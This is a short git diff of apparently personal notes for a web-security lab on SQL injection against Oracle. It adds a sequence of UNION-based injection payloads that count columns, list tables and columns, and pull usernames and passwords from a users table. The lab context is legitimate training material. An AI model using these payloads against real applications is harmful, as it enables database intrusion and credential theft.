@@ -56,12 +56,20 @@ administrator'--
   ```
 ### Lab: SQL injection attack, listing the database contents on Oracle
 ```sh
-'+UNION+SELECT+'abc','def'+FROM+dual--
+order by 2--
 ```
 ```sh
-
+'+UNION+SELECT+null,null+FROM+dual--
 ```
-
+```sh
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+```
+```sh
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+```
+```sh
+'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+```
 ### 
 ```sh
 
